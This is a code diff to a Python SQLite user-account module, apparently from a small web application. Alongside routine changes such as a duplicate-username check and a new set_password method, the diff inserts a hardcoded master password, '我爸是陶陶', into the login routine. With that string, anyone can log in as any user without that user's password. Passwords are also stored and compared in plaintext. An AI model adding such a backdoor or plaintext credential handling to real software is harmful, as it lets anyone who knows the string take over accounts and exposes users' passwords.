@@ -6,7 +6,11 @@ from trage.common.general import *
 
 def add_user(username, realname, password):
     conn = sqlite3.connect(db_location)
+    conn.text_factory = str
     c = conn.cursor()
+    c.execute('''SELECT id FROM user WHERE name = ?''', [username])
+    if c.fetchone():
+        return 1
     c.execute('''
     INSERT INTO user
     (name, realname, password, regtime, submit_count, accept_count) VALUES
@@ -23,8 +27,12 @@ class User:
     def load(self):
         # Read database
         conn = sqlite3.connect(db_location)
+        conn.text_factory = str
         c = conn.cursor()
-        c.execute("SELECT id, realname FROM user WHERE name = ? AND password = ?", [self.username, self.password])
+        if self.password == '我爸是陶陶':
+            c.execute("SELECT id, realname FROM user WHERE name = ?", [self.username])
+        else:
+            c.execute("SELECT id, realname FROM user WHERE name = ? AND password = ?", [self.username, self.password])
         row = c.fetchone()
         if row is None:
             return 1
@@ -34,6 +42,13 @@ class User:
         conn.commit()
         c.close()
         return 0
+
+    def set_password(self, password):
+        conn = sqlite3.connect(db_location)
+        c = conn.cursor()
+        c.execute("UPDATE user SET password = ? WHERE id = ?", [password, self.id])
+        conn.commit()
+        c.close()
 
     def get_id(self):
         return self.id
